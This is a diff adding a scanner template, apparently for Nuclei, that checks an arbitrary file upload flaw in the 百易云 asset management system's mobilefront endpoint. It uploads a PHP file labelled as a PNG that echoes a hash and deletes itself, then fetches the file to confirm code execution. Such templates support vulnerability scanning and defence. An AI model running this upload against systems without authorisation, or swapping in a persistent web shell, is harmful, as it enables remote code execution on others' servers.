@@ -1,0 +1,58 @@
+id: poc-yaml-baiyishequ-mobilefront2-anyfile-upload
+info:
+  name: 百易云资产管理运营系统 mobilefront2 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/mobilefront/c/2.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+    body: |-
+      -----------------------------289666258334735365651210512949
+      Content-Disposition: form-data; name="file1"; filename="1.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      -----------------------------289666258334735365651210512949--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".php"
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        regex:
+          - "(?P<file>\\d+).php"
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/mobilefront/c/images2/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
